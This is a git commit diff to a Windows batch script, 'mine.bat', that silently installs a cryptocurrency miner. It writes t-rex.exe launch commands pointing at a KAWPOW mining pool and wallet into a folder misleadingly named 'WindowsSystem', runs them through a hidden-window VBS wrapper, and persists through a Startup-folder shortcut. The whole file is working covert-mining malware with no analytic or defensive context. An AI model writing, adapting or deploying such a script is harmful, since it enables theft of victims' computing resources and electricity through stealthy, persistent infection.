d65e402e73c90e76f477276ecf37cd9cfd5b6298
Tejasvi Sharma <134033214+iemtejasvi@users.noreply.github.com>
2025-02-18 12:00:10 +0530

    mine.bat

--- mine.bat
+++ mine.bat
@@ -1,35 +1,28 @@
 @echo off
 setlocal
 
-:: Define hidden install directory
-set "INSTALL_DIR=%APPDATA%\WindowsSystem"
-set "MINER_EXE=t-rex.exe"
-set "MINER_SCRIPT=%INSTALL_DIR%\miner.bat"
-set "VBS_SCRIPT=%INSTALL_DIR%\run_hidden.vbs"
+:: Define script name and path
+set "MINER_SCRIPT=%APPDATA%\WindowsSystem\miner.bat"
+set "VBS_SCRIPT=%APPDATA%\WindowsSystem\run_hidden.vbs"
 set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"
 
-:: Ensure install directory exists
-if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+:: Create necessary directories
+mkdir "%APPDATA%\WindowsSystem" 2>nul
 
-:: Copy t-rex.exe to hidden directory
-copy "%~dp0%MINER_EXE%" "%INSTALL_DIR%\%MINER_EXE%" /Y >nul 2>&1
+:: Write miner script
+echo @echo off > "%MINER_SCRIPT%"
+echo :loop >> "%MINER_SCRIPT%"
+echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop) >> "%MINER_SCRIPT%"
+echo start /b t-rex.exe -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe >> "%MINER_SCRIPT%"
 
-:: Create miner script
-(
-echo @echo off
-echo cd /d "%INSTALL_DIR%"
-echo :loop
-echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop)
-echo start /b "" "%INSTALL_DIR%\%MINER_EXE%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
-) > "%MINER_SCRIPT%"
+:: Write VBS script to run miner in hidden mode
+echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
+echo WshShell.Run """%MINER_SCRIPT%""", 0, False >> "%VBS_SCRIPT%"
 
-:: Create VBS script to run miner silently
-(
-echo Set WshShell = CreateObject("WScript.Shell")
-echo WshShell.Run """%MINER_SCRIPT%""", 0, False
-) > "%VBS_SCRIPT%"
-
-:: Create startup shortcut
+:: Create a shortcut in the Startup folder
 powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_SHORTCUT%'); $s.TargetPath='wscript.exe'; $s.Arguments='""%VBS_SCRIPT%""'; $s.Save()"
 
-::
+:: Run miner immediately
+wscript "%VBS_SCRIPT%"
+
+exit
